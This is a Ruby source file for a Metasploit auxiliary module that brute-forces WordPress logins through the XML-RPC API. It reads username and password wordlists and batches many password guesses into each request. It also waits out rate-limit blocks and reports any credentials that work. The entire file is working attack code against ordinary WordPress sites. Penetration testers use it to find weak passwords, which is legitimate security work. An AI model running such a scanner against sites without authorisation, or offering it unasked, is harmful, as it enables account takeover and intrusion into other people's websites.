##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#load "./lib/metasploit/framework/login_scanner/wordpress_rpc.rb"

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/wordpress_rpc'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Wordpress XML-RPC Username/Password Login Scanner',
      'Description'  => %q{
        This module attempts to authenticate against a Wordpress-site
        (via XMLRPC) using username and password combinations indicated
        by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
      },
      'Author'      =>
        [
          'Cenk Kalpakoglu <cenk.kalpakoglu[at]gmail.com>',
          'Sabri',                           #@KINGSABRI
          'William <WCoppola[at]Lares.com>'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'https://wordpress.org/'],
          ['URL', 'http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/'],
          ['CVE', '1999-0502'], # Weak password
          ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/' ],
          ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html' ]
        ],
      'DefaultOptions' =>
        {
          'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt"),
          'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
        }
    ))

    register_options(
      [
        OptInt.new('BLOCKEDWAIT', [ true, 'Time(minutes) to wait if got blocked', 6 ]),
        OptInt.new('CHUNKSIZE',   [ true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500 ])
      ], self.class)

    deregister_options('BLANK_PASSWORDS', 'PASSWORD', 'USERPASS_FILE', 'USER_AS_PASS')
  end

  def passwords
    File.readlines(datastore['PASS_FILE']).map {|pass| pass.chomp}
  end

  def check_setup
    vprint_status("Checking #{peer} status!")

    if !wordpress_and_online?
      print_error("#{peer}:#{rport}#{target_uri} does not appear to be running Wordpress or you got blocked! (Do Manual Check)")
      false
    elsif !wordpress_xmlrpc_enabled?
      print_error("#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC")
      false
    else
      print_status("Target #{peer} is running Wordpress")
      true
    end
  end

  def run_host(ip)
    if check_setup
      print_status("XMLRPC enabled, Hello message received!")
    else
      print_error("XMLRPC is not enabled! Aborting")
      return
    end

    print_status("#{peer} - Starting XML-RPC login sweep...")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: true,
        user_file: datastore['USER_FILE'],
        username: datastore['USERNAME']
    )

    scanner = Metasploit::Framework::LoginScanner::WordpressRPC.new(
      configure_http_login_scanner(
        passwords: passwords,
        chunk_size: datastore['CHUNKSIZE'],
        block_wait: datastore['BLOCKEDWAIT'],
        base_uri: target_uri.path,
        uri: wordpress_url_xmlrpc,
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )

      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :vgood, :ip => ip, :msg => "SUCCESSFUL: #{result.credential}"
      end
    end

  end

end
